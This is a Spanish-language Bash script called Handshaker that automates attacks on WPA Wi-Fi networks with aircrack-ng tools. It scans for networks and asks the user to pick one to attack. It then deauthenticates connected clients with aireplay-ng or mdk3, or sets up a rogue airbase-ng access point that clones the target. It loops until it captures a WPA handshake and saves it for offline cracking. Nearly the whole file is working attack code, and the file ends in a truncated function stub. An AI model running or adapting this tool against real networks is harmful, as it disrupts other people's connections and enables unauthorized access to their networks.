#!/bin/bash

#################################################################
#                                                               #
# # -*- ENCODING: UTF-8 -*-                                     #
# Este programa es software libre. Puede redistribuirlo y/o     #
# modificar-lo bajo los términos de la Licencia Pública General #
# de GNU según es publicada por la Free Software Foundation,    #
# bien de la versión 3 de dicha Licencia o bien (según su       #
# elección) de cualquier versión posterior.                     #
#                                                               #
# Si usted hace alguna modificación en esta aplicación,         #
# deberá siempre mencionar al autor original de la misma.       #
#                                                               #
# Autor:Script creado por Coeman76                              #
#                                                               #
# Integra funciones del Brutus Hack WPA                         #
# Funcion Seleccion tarjeta by kdctv                            #
# Funcion Deteccion Mdk3 adaptada del Brutus Hack WPA           #
# Funcion deteccion root adaptada del Brutus Hack WPA           #
# Funcion Seleccion Red y Handshake Aireplay creadas por        #
# Goyfilms y adaptadas al script por Coeman76                   #
#                                                               #
# Un saludo                                                     # 
#                                                               #
#################################################################
# CHANGELOG 20 junio 2015                                       #
# version : "2015"                                              # 
# Autor: kcdtv                                                  #
# Web : www.wifi-libre.com                                      #
# copyleft : 20-06-2015                                         #
# - Reescritura de la funcción SELECT para funcionamiento con   #
# aircrack-ng 1.2rc2 y futuras versiones.                       #   
# - Supressión de MONSTOP, MONITURUP y START (tareas ya         #
# cubiertas por SELECT )                                        #
# - Modificación de KILL                                        #
# - Desactivación(#) de unas liñas ya no necesarias anotadas    #
# de esta froma "#### mod junio 2015 by kcdtv"                  #
#### EXPLICACIONES SOBRE ACTUALIZACIóN                          # 
# Esta modifcación ha sido necesaria para que se pueda disfrutar#
# del trabajo de coeman76 con las ultimas versiones de          # 
# aircrack-ng (1.2 rc2 y superioes).                            #
# Todos los cambios estan anotados en el codigó y encontrareís  #
# al final del script las funciones originales que fueron       #
# descartadas o modificadas.                                    #    
# Se ha respectado al maximo el diseño y codigó original de     #
# Coeman76 y los terminos de licencia GPLv3                     #
#                                                               #
#       un saludo. kcdtv (www-wifi-libre.com)                   #
#################################################################

# Changes by USUARIONUEVO
# Se deja comentadas las lineas con comando wpaclean
# wpaclean "handshake/$essid ($bssidseparado).cap" "redes/$essid ($bssidseparado)-01.cap" > /dev/null 2>&1
# Y se sustituyen por un simple movimiento de fichero cap a la carpeta handshake
# mv -f "redes/$essid ($bssidseparado)-01.cap" "handshake/$essid ($bssidseparado).cap" > /dev/null 2>&1
# Esto es para evitar posibles problemas con hashcat ya que ni el convertidor online ni la tool cap2hccapx
# convierten el cap a hcccapx alegando incompatibilidad , sin embargo si el mismo cap se convierte con
# aircrack-ng -j CAP CAP , el fichero resultante si seria valido , en cualquier caso mas vale prevenir.

blanco="\033[1;37m"
magenta="\033[0;35m"
rojo="\033[1;31m"
verde="\033[1;32m"
amarillo="\033[1;33m"
azul="\033[1;34m"
orange="\033[0;33m"     ## color añadido update junio 2015
colorbase="\033[0;37m"  ## color añadido update junio 2015 para devolver a la consola su color de texto de origen)
#############################################detecta mdk3 #######################################################

# Se limpia el directorio redes a cada vez
rm -rf redes/*

DETECTMDK3(){                                                                       
which mdk3 &> /dev/null                                                            
if [ $? -ne 0 ]; then  
echo ""
echo -e $rojo " El programa mdk3 no esta Instalado"
echo ""
echo -e $amarillo " Puedes elegir 1 de estos 3 Ataques:"                        
echo ""
echo -e $azul 
echo "1) Aireplay-ng"
echo ""
echo "2) Honeypot"
echo ""
echo "3) Honeypot + Aireplay-ng"
echo -e $amarillo""
read -ep " Escoge una opcion : " P                                                 
case $P in
1)                                                      
echo ""
echo -e $amarillo " Has escogido : "$azul"ATAQUE CON AIREPLAY-NG"
echo -e $magenta "══════════════════════════════════════════════════"
sleep 2
echo ""
echo -e $verde" Capturando Datos y Esperando Handshake...."
SNIFF &
CSV
HANDSHAKE1 
;;
2)                                    
echo ""
echo -e $amarillo " Has escogido : "$azul"ATAQUE CON HONEYPOT"
echo -e $magenta "══════════════════════════════════════════════════"
HONEYPOT
ATAQUEHONEYPOT2
;;
3)                                   
echo ""
echo -e $amarillo " Has escogido : "$azul"ATAQUE CON HONEYPOT + AIREPLAY-NG"
echo -e $magenta "══════════════════════════════════════════════════"
HONEYPOT
ATAQUEHONEYPOT
;;
esac
else
echo ""
echo -e $verde"   MDK3 esta Correctamente Instalado"  
echo -e $magenta "══════════════════════════════════════════════════"
sleep 1 
fi
}
########################################## detectar root ###########################################################
FUNCROOT(){
W=$(whoami)
if [ "$W" == "root" ]; then
sleep 0.5
else 
echo ""
echo " Necesitas loguearte como root para continuar..." 
echo "" 
exit
fi
}
################################################ Seleccion y Ataque Honeypot ##############################################
HONEYPOT(){
echo -e ""$amarillo 
echo -e " Elige el tipo de encriptacion para el Honeypot"
echo -e ""
echo -e $azul"   1) WPA-TKIP"
echo -e "   2) WPA-CCMP"
echo -e "   3) WPA2-TKIP"
echo -e "   4) WPA2-CCMP"
echo -e $verde ""
read -ep " Entrar numero opción : " A
case $A in
1)
xterm -e airbase-ng -c $CANAL -e $essid -W 1 -z 2 -a $bssid $intmon &
;;
2)
xterm -e airbase-ng -c $CANAL -e $essid -W 1 -z 4 -a $bssid $intmon &
;;
3)
xterm -e airbase-ng -c $CANAL -e $essid -W 1 -Z 2 -a $bssid $intmon &
;;
4)
xterm -e airbase-ng -c $CANAL -e $essid -W 1 -Z 4 -a $bssid $intmon &
;;
*)
echo -e $rojo" ERROR: opción no valida"
HONEYPOT   
;;
esac
}
ATAQUEHONEYPOT(){
echo ""
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $verde "              Creando Honeypot..."
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $amarillo""
# airmon-ng start $intrfz > /dev/null 2>&1 #### mod junio 2015 by kcdtv : no mode monitor reanbled
SNIFF1 &
CSV
HANDSHAKE1
}
ATAQUEHONEYPOT1(){
echo ""
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $verde "              Creando Honeypot..."
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $amarillo""
# airmon-ng start $intrfz > /dev/null 2>&1 #### mod junio 2015 by kcdtv : no mode monitor reanbled
SNIFF1 &
CSV
HANDSHAKE2
}
ATAQUEHONEYPOT2(){
echo ""
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $verde "              Creando Honeypot..."
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $amarillo""
# airmon-ng start $intrfz > /dev/null 2>&1 #### mod junio 2015 by kcdtv : no mode monitor reanbled
SNIFF1 &
CSV
HANDSHAKE3
}
################################################ Mdk3 ##############################################################
MDK3(){
xterm -e mdk3 $intmon d $bssid & 
mdk3pid=$! 
sleep 10 && kill $mdk3pid &>/dev/null 
if [ ! -e /proc/$mdk3pid ]; then
sleep 2
fi
}
#############################################SELECT################################################################
## Esta funcción fue redacta el 19 junio de 2015 por kcdtv para www.wifi-libre.com para reemplzar la de coeman76
## La fucción original de Handshaker by Coeman76 ha quedado obsoleta debido a un cambio mayor en aircrack.ng a partir de la versión 1.2rc2
## Se trata del paso de una interfaz en mode monitor de tipo monX a wlanXmon. Aitmon-zc se convertió en airmon-ng con esta nueva forma
## de identificar las interfaces
## Gracias a este cambio se ha podido precindir de otras funciones ya que no se necesita más "matar" a network-manager, dhcpd etc...
## Se ha tambien integrado la funccion MONITORUP aqui
## Por comodidad paa traducionnes los mensages en salida se declaran ahorita :
WARNINGINTERFACE=$( echo -e "
$rojo ERROR: $verde No se detectó ninguna tarjeta inalambrica

 Para obtener soporte visita $amarillo www.wifi-libre.com
")
HEADERINTERFACE=$( echo ""
  echo -e ""$verde"  Se han detectado las siguientes interfaces :"
  echo ""
  echo -e $magenta" ════════════════════════════════════════════════════════════"
echo -e "$colorbase  NUM INTERFAZ       DRIVER                 CHIPSET"
echo -e $magenta" ════════════════════════════════════════════════════════════"$colorbase
)
WARNINGINTERFACESELECTION=$(echo -e $rojo" ERROR!"$verde"...Opcion Invalida")
INTERFACESLECTION=$(echo -e "
$azul   Selecciona una Interfaz:  $amarillo")
### La funcción SELECT revisitada viene ahora
SELECT(){
airmon-ng | sed '1,2d' | sed '$d' >  /tmp/interfaces.txt
if [ "$( wc -l < /tmp/interfaces.txt )" = '0' ]
  then
    echo -e "$WARNINGINTERFACE"
    exit 1
elif  [ "$( wc -l < /tmp/interfaces.txt )" = '1' ] && [ -n "$( cat /tmp/interfaces.txt | awk -F' ' '{ print $2 }' | grep mon )" ]
  then
    intmon=$( cat /tmp/interfaces.txt | awk -F' ' '{ print $2 }')
elif [ "$( wc -l < /tmp/interfaces.txt )" = '1' ] && [ -z "$( cat /tmp/interfaces.txt | awk -F' ' '{ print $2 }' | grep mon )" ]
  then
    echo ""
    echo -e $magenta" ════════════════════════════════════════════════════════════"
    echo -e $verde  "                   Activando modo monitor"
    echo -e $magenta" ════════════════════════════════════════════════════════════"
    echo ""
    airmon-ng start `cat /tmp/interfaces.txt | awk -F' ' '{ print $2 }'`  > /dev/null 2>&1
    intmon=$( echo "`cat /tmp/interfaces.txt | awk -F' ' '{ print $2 }'`mon" )
else
  declare -a PHY                                             
  declare -a INTERFACE
  declare -a DRIVER
  declare -a CHIPSET

    for i in 'PHY' 'INTERFACE' 'CHIPSET' 'DRIVER';            
      do                                                     
        count=1  
       if [ "$i" == "PHY" ]; 
         then                                                          
           while read -r line;                          
             do                                         
               PHY[${count}]="$line"                                                            
               count=$((count+1))                                                               
            done < <( cat /tmp/interfaces.txt | grep wlan | awk -F' ' '{ print $1 }')  
       elif [ "$i" == "INTERFACE" ]; 
         then                                                          
            while read -r line; 
              do                                                            
                INTERFACE[${count}]="$line"                                                            
                count=$((count+1))                                                                
              done < <( cat /tmp/interfaces.txt | grep wlan | awk -F' ' '{ print $2 }')
      elif [ "$i" == "DRIVER" ]; 
          then                                                          
            while read -r line; 
              do                                                            
                DRIVER[${count}]="$line"                                                            
                count=$((count+1))                                                                
            done < <( cat /tmp/interfaces.txt | grep wlan | awk -F' ' '{ print $3 }')
      elif [ "$i" == "CHIPSET" ]; 
          then                                                          
           while read -r line; 
             do                                                            
               CHIPSET[${count}]="$line"                                                            
               count=$((count+1))                                                                
           done < <( cat /tmp/interfaces.txt | grep wlan | awk '{$1=$2=$3=""; print $0}')   
      fi
   done
echo -e "$HEADERINTERFACE"
  for i in ${!PHY[*]} ;                                                    # This why we used a trasnitional file was use, to have a nicer display
       do                                                                     # to select our $INTERFACE
       INTERFACEDISPLAY=$(echo "${INTERFACE[${i}]}                                         " | cut -c -10 )
       DRIVERDISPLAY=$(echo "${DRIVER[${i}]}                                               " | cut -c -22 )
          # if [ "$(echo ${CHIPSET[${i}]})" = "Unknown" ] ; 
          #   then
          #    DRIVERDISPLAY=$(`echo -e"$rojo${DRIVER[${i}]}                      " | cut -c -25` ) 
          # else
          #    DRIVERDISPLAY=$(echo -e "$verdefluo${DRIVER[${i}]}                  " | cut -c -25)
          # fi  
       echo -e "   $amarillo$i    $rojo$INTERFACEDISPLAY  $verde$DRIVERDISPLAY  $orange${CHIPSET[${i}]}$colorbase  "
    done  
    echo -e $magenta" ════════════════════════════════════════════════════════════"$colorbase
    #echo -e "$blanco  Enter the number of the wireless Interface that you want to use : $amarillo"
    echo "$INTERFACESLECTION"
    read  -n 1 -ep "     $SELECTEDINTERFACE" x
    echo -e "$colorbase"
      until [ "$x" -gt 0 ] &>/dev/null && [ "$x" -le "$i" ] &>/dev/null ;    
        do 
          #echo -e "$rojo ERROR : Selected interface does not exist. Re-enter your choice" 
          #echo -e "$blanco  Enter the number of the wireless Interface that you want to use : $amarillo"
          echo "$WARNINGINTERFACESELECTION"
          echo "$INTERFACESLECTION"
          read  -n 1 -ep "     $SELECTEDINTERFACE" x
          echo -e "$colorbase"
      done
                                 
   intmon=$(echo "${INTERFACE[${x}]}") 
   if [ -z "$(echo $intmon | grep mon)" ]
     then
       echo ""
       echo -e $magenta" ════════════════════════════════════════════════════════════"
       echo -e $verde"           Activando "$amarillo""$intmon""$verde" en modo monitor"
       echo -e $magenta" ════════════════════════════════════════════════════════════"
       echo "" 
       airmon-ng start $intmon > /dev/null 2>&1 
       intmon=$( echo "$intmon`echo "mon"`" )
   fi
fi  
}
############################################ FIN FUNCCION MODIFICADA by kcdtv 4 www.wifi-libre.com ###############
##################################################Buscar redes######################################################
SEARCH(){
echo -e $verde "  Iniciando escaneo de redes..."$rojo"Ctrl + C detiene el proceso "
echo -e $magenta" ════════════════════════════════════════════════════════════"
echo ""
sleep 2
xterm -e airodump-ng --encrypt WPA -w ./redes/Redes $intmon  
linap=`cat redes/Redes-01.csv | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
linap=`expr $linap - 1`
head -n $linap redes/Redes-01.csv &> redes/Redes.csv 
tail -n +$linap redes/Redes-01.csv &> redes/clientes.csv 
clear
lincsv=`wc -l redes/Redes.csv | awk '{print $1}'`
if [ $lincsv -le 3 ]; then
echo ""
echo -e $rojo
echo -e " No se encontró ninguna red...saliendo del script..."
echo ""
KILL
sleep 2
exit
fi
rm -rf redes/Redes.txt> /dev/null 2>&1
i=0
while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESSID KEY; do
caracteres_mac=${#MAC}
if [ $caracteres_mac -ge 17 ]; then
i=$(($i+1))
if [[ $POWER -lt 0 ]]; then
if [[ $POWER -eq -1 ]]; then
POWER=0
else
POWER=`expr $POWER + 100`
fi
fi
POWER=`echo $POWER | awk '{gsub(/ /,""); print}'`  
ESSID=`expr substr "$ESSID" 2 $IDLENGTH` 
if [ $CHANNEL -gt 13 ] || [ $CHANNEL -lt 1 ]; then
CHANNEL=0
else
CHANNEL=`echo $CHANNEL | awk '{gsub(/ /,""); print}'`
fi
if [ "$ESSID" = "" ] || [ "$CHANNEL" = "-1" ]; then
ESSID="(Red Oculta)"
fi
echo -e "$MAC,$CHANNEL,$POWER,$ESSID" >> redes/Redes.txt
fi
done < redes/Redes.csv
sort -t "," -d -k 4 "redes/Redes.txt" > "redes/redes_wifi.txt"
}
################################################seleccionar red#####################################################
SELECTWIFI(){
clear
echo
echo -e  $azul"  Nº         BSSID       CANAL   PWR      ESSID"
echo -e  $magenta"  ══   ═════════════════ ═════  ═════ ═════════════""$verde"
echo ""
i=0
while IFS=, read MAC CANAL POTENCIA ESSID; do
i=$(($i+1))
if [ $i -le 9 ]; then
ESPACIO1=" "
else
ESPACIO1=""
fi
if [[ $CANAL -le 9 ]]; then
ESPACIO2=" "
if [[ $CANAL -eq 0 ]]; then
CANAL="-"
fi
else
ESPACIO2=""
fi
if [[ "$POTENCIA" = "" ]]; then
POTENCIA=0
fi
if [[ $POTENCIA -le 9 ]]; then
ESPACIO4=" "
else
ESPACIO4=""
fi
CLIENTE=`cat redes/clientes.csv | grep $MAC`
if [ "$CLIENTE" != "" ]; then
CLIENTE="*" 
ESPACIO5=""
else
ESPACIO5=" "
fi
nombres_ap[$i]=$ESSID
canales[$i]=$CANAL
macs[$i]=$MAC
echo -e " $ESPACIO1$i)"$blanco"$CLIENTE"$amarillo"  $ESPACIO5$MAC "$verde"  $ESPACIO2$CANAL  "$amarillo"  $ESPACIO4$POTENCIA%  "$verde" $ESSID "
done < "redes/redes_wifi.txt"
echo
if [ $i -eq 1 ]; then
select=1
else
echo -e $verde "("$blanco"*"$verde") Red con Clientes"$azul""
echo ""
read -p " Selecciona la red a atacar : " select
fi
while [[ $select -lt 1 ]] || [[ $select -gt $i ]]; do
echo ""
echo -e $rojo " ERROR!"$verde" Opcion Incorrecta"$azul""
echo ""
read -p " Selecciona la red a atacar : " select
done
essid=${nombres_ap[$select]}
CANAL=${canales[$select]}
bssid=${macs[$select]}
bssidseparado=`echo $bssid | awk '{gsub(/:/,"-"); print}'`
echo ""
if [ "$essid" = "(Red Oculta)" ]; then
echo -e $rojo ""
echo -e " ERROR!: has seleccionado una red oculta..."
echo -e $amarillo""
sleep 1
echo -e " Saliendo del Script..."
KILL
exit
fi
}
########################################Capturar Trafico##########################################################
SNIFF(){
xterm -e airodump-ng --bssid $bssid -c $CANAL,$CANAL -w "redes/$essid ($bssidseparado)" $intmon &
}
SNIFF1(){
xterm -e airodump-ng --bssid $bssid -c $CANAL,$CANAL -w "redes/$essid ($bssidseparado)" $intmon &
}                   ### mod by kcdtv junio 2015 : se guarda la misma interfaz 
############################################Tamaño y calculo Captura################################################
CALCULANUM(){
NUM=`ls -1 redes/"$essid ($bssidseparado)"-*.cap | wc -l`
if [ $NUM -lt 10 ]; then
CERO="0"
else
CERO=""
fi
}
#############################################CSV##################################################################
CSV(){
counter=1
ls redes/"$essid ($bssidseparado)"-01.csv > /dev/null 2>&1
while [ ! $? -eq 0 ]; do
echo -e ""$azul".\c"
sleep 0.2
counter=$((counter+1))
if [ $counter -gt 15 ]; then
counter=1
fi
ls redes/"$essid ($bssidseparado)"-01.csv > /dev/null 2>&1
done
echo -e "$amarillo\n"
}
########################################### Forzar Handshake Aireplay ##############################################
HANDSHAKE1(){
hay=""
airsnif=`ps -A | grep airodump-ng | grep -v grep`
intervalo=20
while [ ! "$airsnif" = "" ]; do
CALCULANUM
varios=`cat redes/"$essid ($bssidseparado)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
cuantoshay=`echo $varios | wc -w`
if [ "$varios" = "" ]; then
CALCULANUM
echo -e $azul"\r${TAB} Buscando clientes...\c"
CONT=1
while [ $CONT -le 25 ]; do
echo -e " \c"
sleep 0.05
CONT=$((CONT+1))
done
else
CONT=1
while [ $CONT -le $cuantoshay ]; do
hay=`echo $varios | awk '{print $'$CONT'}'`
clientemac=`echo -n $hay | cut -c-8`
echo -en $verde"\r Desautenticando cliente "$amarillo"$hay... \033[K"
xterm -e aireplay-ng -R --ignore-negative-one -0 5 -a $bssid -c $hay $intmon
CONT=$((CONT+1))
done
CONT=$intervalo
while [ $CONT -ge 1 ]; do
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ $CONT -eq 1 ]; then
echo -e $azul"\r${TAB} Reiniciando ataque en "$verde" $CONT...   $amarillo $hands  \c"$verde
else
if [ $CONT -lt 10 ]
then
echo -e $azul"\r${TAB} Reiniciando ataque en "$verde" $CONT...   $amarillo $hands  \c"$verde
else
echo -e $azul"\r${TAB} Reiniciando ataque en "$verde" $CONT...   $amarillo $hands  \c"$verde
fi
fi
if [ "$hands" = "(1 handshake)" ]; then
echo -e $amarillo
break
fi
sleep 1
CONT=$((CONT-1))
done
fi
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$hands" = "(1 handshake)" ]; then
clear
echo ""
echo ""
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $blanco"         ¡¡¡ "$verde"HANDSHAKE CONSEGUIDO"$blanco" !!!"
echo -e $magenta "══════════════════════════════════════════════════"
#wpaclean "handshake/$essid ($bssidseparado).cap" "redes/$essid ($bssidseparado)-01.cap" > /dev/null 2>&1
mv -f "redes/$essid ($bssidseparado)-01.cap" "handshake/$essid ($bssidseparado).cap" > /dev/null 2>&1
KILL
ruta_handshake=`cd ./handshake ; readlink -f "$essid ($bssidseparado).cap"`
echo ""
echo ""
echo -e $amarillo " El Handshake se encuentra en la carpeta handshake  ;) "
echo ""
echo -e " La ruta del handshake es "$verde"$ruta_handshake" 
sleep 1
echo "" 
echo -e $azul " Bye Bye..."
echo ""
break
fi
done
}
############################################# Forzar Handshake MDK3 ##################################################
HANDSHAKE2(){
intervalo=20
hay=""
airsnif=`ps -A | grep airodump-ng | grep -v grep`
while [ ! "$airsnif" = "" ]; do
CALCULANUM
varios=`cat redes/"$essid ($bssidseparado)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
cuantoshay=`echo $varios | wc -w`
if [ "$varios" = "" ]; then
CALCULANUM
echo -e $azul"\r${TAB} Buscando clientes...\c"
CONT=1
while [ $CONT -le 25 ]; do
echo -e " \c"
sleep 0.05
CONT=$((CONT+1))
done
else
CONT=1
while [ $CONT -le $cuantoshay ]; do
hay=`echo $varios | awk '{print $'$CONT'}'`
clientemac=`echo -n $hay | cut -c-8`
echo -en $verde"\r Lanzando ataque MDK3 a "$azul"$essid... \033[K""$verde"
echo ""
sleep 1
MDK3
CONT=$((CONT+1))
done
CONT=$intervalo
while [ $CONT -ge 1 ]; do
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ $CONT -eq 1 ]; then
echo -e $azul"\r${TAB} Reiniciando ataque en  "$verde"$CONT...   $amarillo  $hands \c"$verde
else
if [ $CONT -lt 10 ]; then
echo -e $azul"\r${TAB} Reiniciando ataque en  "$verde"$CONT...   $amarillo  $hands \c"$verde
else
echo -e $azul"\r${TAB} Reiniciando ataque en  "$verde"$CONT...   $amarillo  $hands \c"$verde
fi
fi
if [ "$hands" = "(1 handshake)" ]; then
echo -e $amarillo
break
fi
sleep 1
CONT=$((CONT-1))
done
fi
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$hands" = "(1 handshake)" ]; then
clear
echo ""
echo ""
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $blanco"         ¡¡¡ "$verde"HANDSHAKE CONSEGUIDO"$blanco" !!!"
echo -e $magenta "══════════════════════════════════════════════════"
#wpaclean "handshake/$essid ($bssidseparado).cap" "redes/$essid ($bssidseparado)-01.cap" > /dev/null 2>&1
mv -f "redes/$essid ($bssidseparado)-01.cap" "handshake/$essid ($bssidseparado).cap" > /dev/null 2>&1
KILL
ruta_handshake=`cd ./handshake ; readlink -f "$essid ($bssidseparado).cap"`
echo ""
echo ""
echo -e $amarillo " El Handshake se encuentra en la carpeta handshake  ;) "
echo ""
echo -e " La ruta del handshake es "$verde"$ruta_handshake"
sleep 1
echo "" 
echo -e $azul " Bye Bye..."
echo ""
break
fi
done
}
####################################### Handshake Honeypot ###########################################################
HANDSHAKE3(){
intervalo2=300
hay=""
airsnif=`ps -A | grep airodump-ng | grep -v grep`
while [ ! "$airsnif" = "" ]; do
CALCULANUM
varios=`cat redes/"$essid ($bssidseparado)"-01.csv | grep -v WPA | grep $bssid | awk -F ',' '{print $1}'| awk '{gsub(/ /,""); print}'` 
cuantoshay=`echo $varios | wc -w`
if [ "$varios" = "" ]; then
CALCULANUM
echo -e $azul"\r Buscando clientes...\c"
while [ $CONT -le 25 ]; do
echo -e " \c"
sleep 0.05
CONT=$((CONT+1))
done
else
CONT=1
while [ $CONT -le $cuantoshay ]; do
hay=`echo $varios | awk '{print $'$CONT'}'`
clientemac=`echo -n $hay | cut -c-8`
echo -en $verde"\r Lanzando Honeypot... \033[K""$verde"
CONT=$((CONT+1))
done
CONT=$intervalo2
while [ $CONT -ge 1 ]; do
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$hands" = "(1 handshake)" ]; then
echo -e $amarillo
break
fi
done
fi
CALCULANUM
datas=`cat ./redes/"$essid ($bssidseparado)"-01.csv | grep "WPA" | awk '{print $11}' FS=',' | awk '{gsub(/ /,""); print}'`
if [[ $datas -ne 0 ]]; then
hands=`aircrack-ng redes/"$essid ($bssidseparado)"-01.cap | grep $bssid | tail --bytes 14`
fi
if [ "$hands" = "(1 handshake)" ]; then
clear
echo ""
echo ""
echo -e $magenta "══════════════════════════════════════════════════"
echo -e $blanco"         ¡¡¡ "$verde"HANDSHAKE CONSEGUIDO"$blanco" !!!"
echo -e $magenta "══════════════════════════════════════════════════"
#wpaclean "handshake/$essid ($bssidseparado).cap" "redes/$essid ($bssidseparado)-01.cap" > /dev/null 2>&1
mv -f "redes/$essid ($bssidseparado)-01.cap" "handshake/$essid ($bssidseparado).cap" > /dev/null 2>&1
KILL
ruta_handshake=`cd ./handshake ; readlink -f "$essid ($bssidseparado).cap"`
echo ""
echo ""
echo -e $amarillo " El Handshake se encuentra en la carpeta handshake  ;) "
echo ""
echo -e " La ruta del handshake es "$verde"$ruta_handshake"   
sleep 1
echo "" 
echo -e $azul " Bye Bye..."
echo ""
break
fi
done
}  
#################################################Matar los procesos###################################################
################################ FUNCCION KILL MODIFICADA 19-06-2015 by kcdtv 4 www.wifi-libre.com
## El "nuevo" airmon-ng nods permite precindir de varios elementos en la funccion oiriginal
KILL(){
echo -e $verde "                   Version "$blanco"1.1 "$verde"by "$blanco"Coeman76 "
echo -e $verde "  Version$blanco 2015$orange para aircrack-ng 1.2rc2 y versiones superiores$verde by$blanco kcdtv$colorbase " 
echo ""
echo -e "                              para soporte visita$amarillo www.wifi-libre.com "
echo -e "$colorbase" # quitar colores
airmon-ng stop $intmon > /dev/null 2>&1 # desactivando el mode monitor
rm -fr ./redes > /dev/null 2>&1
mkdir redes > /dev/null 2>&1
rm -r /tmp/interfaces.txt > /dev/null 2>&1 # borrando el fichero transicional para la nueva funccion 
}
########################### FINAL MOD ##############################################################################
###################################### PROGRAMA HANDSHAKER ##########################################################
FUNCROOT
# KILL ### Se desactiva ya que no se necesitya en inicio de script (mod 19-06-2015 by kcdtv)
clear
echo ""
echo ""
echo ""
echo "" 
echo -e $amarillo "  _   _                 _"$magenta" _____ _           _  "           
echo -e $amarillo " | | | |               | "$magenta"/  ___| |         | |  "          
echo -e $amarillo " | |_| | __ _ _ __   __| "$magenta"\ |--.| |__   __ _| | _____ _ __  "
echo -e $amarillo " |  _  |/ _ \| '_ \ / _  |"$magenta" --. \ |_ \ / _  | |/ / _ \  __| "
echo -e $amarillo " | | | | (_| | | | | (_| "$magenta"/\__/ / | | | (_| |   <  __/ |    "
echo -e $amarillo " \_| |_/\__,_|_| |_|\__,_"$magenta"\____/|_| |_|\__,_|_|\_\___|_| "
echo -e ""
echo -e $verde "                   Version "$blanco"1.1 "$verde"by "$blanco"Coeman76 "
echo -e $verde "  Version$blanco 2015$orange para aircrack-ng 1.2rc2 y versiones superiores$verde by$blanco kcdtv$colorbase " ## añadido para la mod
echo ""
echo -e "                              para soporte visita$amarillo www.wifi-libre.com "                                       ## idem
sleep 3
clear 
clear
echo ""
echo ""
echo -e $amarillo"╔═════════════════════════════════════════════╗" 
echo -e $amarillo"║  "$azul" Bienvenido a Handshaker "$blanco"v1.1"$azul" by Coeman76  "$amarillo"║"
echo -e "╚═════════════════════════════════════════════╝"
sleep 3
clear 
SELECT
#START ### Se desactiva ya que no existe - integrado en SELECT (mod 19-06-2015 by kcdtv)
#MONITORUP ### Se desactiva ya que no existe - integrado en SELECT (mod 19-06-2015 by kcdtv)
SEARCH
SELECTWIFI
echo ""
echo -e $magenta "══════════════════════════════════════════════════"
echo ""
echo -e $amarillo" Escoge entre uno de los siguientes ataques"
echo ""
echo ""
echo -e $azul" 1) Aireplay-ng"
echo
echo " 2) MDK3"
echo
echo " 3) Honeypot"
echo
echo " 4) Honeypot + Aireplay-ng"
echo
echo " 5) Honeypot + MDK3"
echo ""
echo -e $amarillo""
read -p " Escoge una opcion : " OPC
echo ""
if [ "$OPC" = 1 ]; then
echo ""
echo -e $amarillo " Has escogido : "$azul"ATAQUE CON AIREPLAY-NG"
echo -e $magenta "══════════════════════════════════════════════════"
echo ""
echo -e $verde" Capturando Datos y Esperando Handshake...."
SNIFF &
CSV
HANDSHAKE1
elif [ "$OPC" = 2 ]; then
echo ""
echo -e $amarillo " Has escogido : "$azul"ATAQUE CON MDK3"
echo -e $magenta "══════════════════════════════════════════════════"
DETECTMDK3
echo ""
echo -e $verde" Capturando Datos y Esperando Handshake...."
SNIFF &
CSV
HANDSHAKE2
elif [ "$OPC" = 3 ]; then
echo ""
echo -e $amarillo " Has escogido : "$azul"ATAQUE CON HONEYPOT"
echo -e $magenta "══════════════════════════════════════════════════"
HONEYPOT
ATAQUEHONEYPOT2
elif [ "$OPC" = 4 ]; then
echo ""
echo -e $amarillo " Has escogido : "$azul"ATAQUE CON HONEYPOT + AIREPLAY-NG"
echo -e $magenta "══════════════════════════════════════════════════"
HONEYPOT
ATAQUEHONEYPOT
elif [ "$OPC" = 5 ]; then
echo ""
echo -e $amarillo " Has escogido : "$azul"ATAQUE CON HONEYPOT + MDK3"
echo -e $magenta "══════════════════════════════════════════════════"
echo ""
DETECTMDK3
HONEYPOT
ATAQUEHONEYPOT1
fi
################################################## Fin #############################################################
exit 0 ### añadido para salir limpiamente mod junio 2015 by kcdtv



################################ FUNCCIONES ORIGINALES MODIFICADAS O ELEMINADAS
#### Aqui teneís a las partes del codigo original que se han eleminado
#### Podeís procuraros el trebajo original en su integralidad aqui : http://www31.zippyshare.com/v/43496631/file.html
####                                                                 https://www.wifi-libre.com/img/members/3/HandshakerV1_11.zip
################################################################################
####################################################Seleccionar la tarjeta###########################################
SELECT(){

